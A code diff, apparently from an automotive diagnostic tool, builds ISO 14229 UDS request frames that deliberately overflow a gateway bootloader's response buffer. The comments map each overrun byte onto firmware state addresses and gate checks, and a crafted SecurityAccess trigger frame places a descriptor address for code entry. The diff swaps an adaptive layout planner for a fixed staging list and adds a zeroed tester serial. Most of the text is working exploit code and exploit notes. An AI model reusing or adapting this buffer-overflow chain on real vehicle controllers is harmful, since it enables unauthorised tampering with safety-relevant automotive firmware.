@@ -433,122 +433,35 @@ def build_uflash_faci_payloads(
 # them and leaves them out of the answer, so the repeats of F17C and F15B are padding that places the write.
 # Every length involved is a constant in the firmware — the bootloader's F15B handler copies two 10-byte NvM
 # records in a loop that always runs twice — so the layout of this answer is the same on every gateway.
-STAGE1_TOTAL = 338  # every DID of the staged list answers a length fixed in the firmware, so this never moves
+#
+# Both staged answers overrun the bootloader's response buffer (0xFEDE0B18, cleared with memset(.., 0, 0x14A), so
+# 330 bytes) onto the request dispatcher's state block that follows it:
+#   stage 1, 338 bytes: resp[330..337] -> 0xFEDE0C62..69, ending 04 10 05 (0410 last, value from 2E 0410 05)
+#   stage 2, 337 bytes: resp[330..336] -> 0xFEDE0C62..68, ending 04 10 48
+# Stage 2 rewrites all of it but 0C69, so stage 1 is there for its overrun (0C69 = 05), not for its answer.
+# 0C62 is the suppress-positive-response flag: stage 2 lands FAZIT digits on it and is never answered, and the
+# trigger works all the same. Stage 1 lands bytes 5..9 of the last F15B record on 0C62..0C66: tester serial
+# bytes 2..5 of the last `2E F15A` and a status byte. Every stage-1 answer logged so far had zero on 0C62 and
+# 0C64; the serial 01 02 03 04 05 06 that ContiTool wrote up to 2.0.1d puts 03 / 05 there and silences it.
+STAGE1_TOTAL = 338
 KNOWN_DID_LENGTHS: dict[int, int] = {0xF17C: 23, 0xF1A2: 6, 0xF15B: 20, 0x0410: 1}
 STAGE1_KNOWN = [0xF17C] * 6 + [0xF1A2, 0xF15B]
 STAGE1_KNOWN_TAIL = [0xF15B] * 7 + [0x0410]
-# Read one by one when the staging stays silent: every DID in the bootloader's read table (bench AA CodeFlash
-# 0x1B24..0x1BC3). The planner needs sizes to hit both byte counts, and above all a value whose last five bytes
-# read 00 ?? 00 ?? <gate>; ASCII identifiers never contain a zero, so the binary DIDs are the ones that can.
-STAGE1_MEASURE_DIDS = (0xF17C, 0xF1A2, 0xF15B, 0x0410, 0xF199, 0x0407, 0x040A, 0x040F, 0xF186, 0xF187, 0xF189,
-                       0xF18C, 0xF191, 0xF19E, 0xF1AA, 0xF1A3, 0xF1AB, 0xF1D5, 0xF1DF, 0x0BD3)
+STAGE1_OVERRUN = 330  # resp[330:] is what landed on 0xFEDE0C62..69
+# Tester serial for `2E F15A` (date + these 6 bytes). Its bytes 2..5 land on 0C62..0C65 in stage 1 (see above):
+# all zero, as on the factory record of a gateway that answered. `2E F15A` itself only fills a RAM buffer
+# (0xFEDE0AF8, handler 0x0100440E); the bootloader stores it into a block's F15B record only while erasing that
+# block (31 01 FF 00, 0x0100323E), so a bad record on the application block goes away with the next app write.
+FBL_TESTER_SERIAL = bytes(6)
 
 
 def _did_req(entries: list[int]) -> bytes:
     return bytes([0x22]) + b"".join(did.to_bytes(2, "big") for did in entries)
 
 
-# The bootloader clears its response buffer with memset(0xFEDE0B18, 0, 0x14A), so the buffer is 330 bytes and a
-# 338-byte answer overruns it by exactly eight onto the state block that follows:
-#   resp[330..333] -> 0xFEDE0C62..65, resp[334] -> 0xFEDE0C66, resp[335..337] -> 0xFEDE0C67..69.
-# 0x0C66 is read back as a signed byte and gated: `== 0` or `> 3` returns without answering at all, which is the
-# silence users report. The last three bytes are payload, not a checksum: reading 0410 last delivers 04 10 <v>,
-# with <v> set by the preceding `2E 0410 <v>`.
-# The crafted DIDs contribute nothing to the answer — the bootloader does not know them — they exist to place
-# `0E 12 00 01` at offset 18 of the *request*, which is the descriptor address 0x0100120E. That pins them to
-# slots 9..11, so exactly eight DIDs may precede them.
-STAGE1_BUFFER = 330
-STAGE1_GATE_INDEX = 334
-STAGE1_GATE_OK = frozenset({1, 2, 3}) | frozenset(range(0x80, 0x100))
-STAGE1_SLOTS_BEFORE, STAGE1_SLOTS_AFTER = 8, 8  # after includes 0410, which must stay last
-# What the rest of the overrun lands on, from every access to 0xFEDE0C62..0C69 in the bench AA Uflash
-# (request dispatcher 0x010046D8..0x0100488C). A rebuilt layout moves these bytes, so each must stay harmless:
-#   0C62 resp[330]  suppress-positive-response flag, read right after the handler (0x0100485C): non-zero
-#                   clears the response length and the answer is never sent — exactly the silence we fight.
-#   0C63 resp[331]  service index, overwritten with 12 (0x0100486E) before anything reads it again: free.
-#   0C64 resp[332]  cleared only at start-up and read after every positive answer (0x0100484E): zero lets the
-#                   bootloader update its boot flags word 0xFEDFFFE4 as on the verified path; anything else
-#                   switches that update off until the next reset. The verified layout leaves it 0, so must we.
-#   0C65 resp[333]  cleared at the start of every request (0x010046EE) before any handler reads it: free.
-#   0C66 resp[334]  the gate above.
-#   0C67..69        always 04 10 <v>: 0410 stays last.
-STAGE1_STATE_OK: dict[int, frozenset[int]] = {
-    330: frozenset({0}),
-    332: frozenset({0}),
-    STAGE1_GATE_INDEX: STAGE1_GATE_OK,
-}
-
-
-def stage1_state_ok(resp: bytes) -> bool:
-    """True when every overrun byte the bootloader reads back holds a value that keeps the entry on track."""
-    return len(resp) == STAGE1_TOTAL and all(resp[i] in ok for i, ok in STAGE1_STATE_OK.items())
-
-
-def build_stage1_did_list() -> list[int]:
-    """The hardware-verified staging list, as DIDs."""
-    return [*STAGE1_KNOWN, *UNKNOWN_DIDS, *STAGE1_KNOWN_TAIL]
-
-
-def simulate_stage1_response(dids: list[int], values: dict[int, bytes]) -> bytes:
-    """The answer the bootloader would build: `0x62`, then DID + value for each one it knows, others skipped."""
-    out = bytearray(b"\x62")
-    for did in dids:
-        value = values.get(did)
-        if value is not None:
-            out += did.to_bytes(2, "big") + value
-    return bytes(out)
-
-
-def _combos(sizes: list[tuple[int, int]], slots: int, keep: int = 6) -> dict[tuple[int, int], list[list[int]]]:
-    """Up to `keep` DID multisets per (slot count, byte total), built breadth-first so the search stays bounded."""
-    reach: dict[tuple[int, int], list[list[int]]] = {(0, 0): [[]]}
-    for used in range(slots):
-        for (n, total), combos in list(reach.items()):
-            if n != used:
-                continue
-            for did, size in sizes:
-                key = (n + 1, total + size)
-                if total + size > STAGE1_TOTAL:
-                    continue
-                bucket = reach.setdefault(key, [])
-                if len(bucket) < keep:
-                    bucket.append([*combos[0], did])
-    return reach
-
-
-def plan_stage1_dids(values: dict[int, bytes]) -> list[int] | None:
-    """Lay the staged request out for this gateway, using what its DIDs actually answer.
-
-    `values` is each DID read on its own. The answer still has to measure STAGE1_TOTAL and keep `0410` last, and
-    on top of that every overrun byte the bootloader reads back (STAGE1_STATE_OK) has to hold a value it accepts
-    — on a gateway where the gate byte does not, the entry simply returns without answering. Returns the DID
-    list, or None when no layout fits."""
-    if 0x0410 not in values:
-        return None
-    sizes = sorted(((did, 2 + len(v)) for did, v in values.items() if v and did != 0x0410), key=lambda i: -i[1])
-    if not sizes:
-        return None
-    heads = _combos(sizes, STAGE1_SLOTS_BEFORE)
-    tails = _combos(sizes, STAGE1_SLOTS_AFTER - 1)
-    tail_size = 2 + len(values[0x0410])
-    for (hn, hsum), head_list in sorted(heads.items()):
-        if hn != STAGE1_SLOTS_BEFORE:
-            continue
-        want = STAGE1_TOTAL - 1 - hsum - tail_size
-        for tail in tails.get((STAGE1_SLOTS_AFTER - 1, want), []):
-            for head in head_list:
-                dids = [*head, *UNKNOWN_DIDS, *tail, 0x0410]
-                if stage1_state_ok(simulate_stage1_response(dids, values)):
-                    return dids
-    return None
-
-
-def build_service_loader_uds_steps(stage1_dids: list[int] | None = None) -> tuple[bytes, bytes, bytes]:
-    """Return (stage1_did_req, stage2_did_req, sa_trigger_req) as pure ISO 14229 UDS frames.
-
-    `stage1_dids` replaces the hardware-verified staging list with one laid out for this gateway by
-    `plan_stage1_dids`; without it the verified list is used unchanged."""
-    stage1 = stage1_dids if stage1_dids is not None else [*STAGE1_KNOWN, *UNKNOWN_DIDS, *STAGE1_KNOWN_TAIL]
+def build_service_loader_uds_steps() -> tuple[bytes, bytes, bytes]:
+    """Return (stage1_did_req, stage2_did_req, sa_trigger_req) as pure ISO 14229 UDS frames."""
+    stage1 = [*STAGE1_KNOWN, *UNKNOWN_DIDS, *STAGE1_KNOWN_TAIL]
     stage2 = [0xF15B] * 8 + list(UNKNOWN_DIDS) + [0xF15B] * 6 + [0xF17C, 0x0410]
     trigger = bytes.fromhex("2712deadbeef0000000000000000000000000e120001")
     return _did_req(stage1), _did_req(stage2), trigger
